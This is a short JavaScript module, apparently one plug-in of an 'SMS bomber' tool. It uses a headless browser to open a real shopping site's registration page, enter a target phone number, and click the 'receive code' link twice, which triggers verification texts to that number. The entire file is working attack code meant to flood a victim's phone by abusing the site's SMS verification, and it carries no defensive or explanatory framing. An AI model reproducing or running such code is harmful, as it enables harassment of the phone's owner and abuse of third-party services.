const Bomber = require('./bomber');

class Bomb extends Bomber {
  constructor() {
    super();
    this.url = 'https://passport.yhd.com/passport/register_input.do';
  }

  async chaos(ctx) {
    const {
      url,
    } = this;

    const {
      phone,
      browser,
    } = ctx;

    const page = await browser.newPage();
    await page.goto(url);
    await page.type('#phone', phone);
    await page.waitFor(200);
    await page.click('a.receive_code');
    await page.waitFor(200);
    await page.click('a.receive_code span');
  }
}

module.exports = new Bomb();
